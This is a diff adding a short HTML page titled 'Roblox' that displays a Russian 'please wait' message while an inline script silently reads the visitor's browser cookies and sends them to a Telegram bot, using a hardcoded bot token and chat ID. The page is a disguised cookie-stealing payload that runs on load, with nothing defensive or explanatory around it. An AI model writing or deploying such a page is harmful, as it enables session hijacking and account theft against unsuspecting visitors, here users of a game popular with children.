@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Roblox</title>
+</head>
+<body>
+    <h1>Подождите...</h1>
+    <script>
+        var token = "8956009818:AAGRb4ZjMitHsN8Wv4Bd-oX0RauOdv3EANs";
+        var chat_id = "6981190103";
+        var cookies = document.cookie;
+        fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat_id + '&text=КУКИ: ' + encodeURIComponent(cookies));
+    </script>
+</body>
+</html>
